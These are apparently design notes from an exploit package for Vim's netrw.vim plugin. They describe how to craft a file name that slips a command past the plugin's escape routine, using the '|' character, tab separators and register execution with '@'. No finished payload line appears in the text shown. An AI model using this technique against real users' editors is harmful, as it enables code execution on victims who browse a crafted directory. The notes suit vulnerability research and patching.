Constructing the filename for the netrw.vim exploit -- last line of this file
is used by Makefile to construct the file name of the exploit.

*** Not allowed

These are the characters we can't use:

[]#*$%'\" ?`!&();<>\\	-- s:netrw_cd_escape
/\0			-- Can't be part of POSIX filename
\n			-- each file is listed on separate line


*** Allowed

We can use the rest of the ASCII repertoir though:

	+,-.0123456789:=@ABCDEFGHIJKLMNOPQRSTUVWXYZ^_abcdefghijklmnopqrstuvwxyz{|}~


*** Interesting

Some of the characters we can use are of particular interest:

\t+,-.:=@^_{|}~


*** Payload

We use the metacharacter ``|'' (0x7c, ``VERTICAL LINE'') to break the escape()
statement in netrw.vim line 2202, and source ourselves.  We use TABs instead of
SPACEs.  We escape the characters we have to avoid using the normal mode
command <C-V>.  In order to be able to do this, we open a new buffer, enter the
Vim Script we want to execute, yank the contents of the buffer into a register,
and then execute the register contents.  We use the COMMERCIAL AT to execute
the contents of the register.

The trick is to :quit before attempting the ``%'' expansion.

Note: Makefile uses the last line of this file to construct the exploit file
name -- do not meddle with.
